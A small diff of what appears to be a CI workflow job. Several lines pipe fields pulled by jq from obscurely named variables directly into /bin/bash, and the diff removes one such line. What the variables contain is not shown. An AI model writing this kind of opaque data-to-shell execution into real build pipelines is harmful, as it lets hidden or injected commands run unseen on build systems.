@@ -28,7 +28,6 @@ jobs:
           echo $p54 | jq -r .er05802 | /bin/bash
           printf '%s' "$jfduw42966" | jq -r .p1188 | /bin/bash
           printf '%s' "$d2" | jq -r .lswd38 | /bin/bash
-          echo $pcz295 | jq -r .vwyz8099 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
